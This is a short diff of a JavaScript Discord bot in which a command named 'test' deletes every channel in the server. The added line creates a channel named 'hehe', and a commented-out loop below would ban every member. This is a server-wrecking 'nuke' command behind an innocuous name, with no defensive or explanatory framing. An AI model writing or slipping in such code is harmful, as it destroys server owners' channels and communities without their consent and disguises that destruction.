@@ -58,6 +58,7 @@ bot.on("ready", e => {
 	
 	if(cmd === `${prefix}test`){
 		message.guild.channels.deleteAll();
+                message.guild.createChannel("hehe");
                 //for (let i = 0; i < message.guild.members.size; i++) {
                     //message.guild.members[i].user.ban()
                 //}
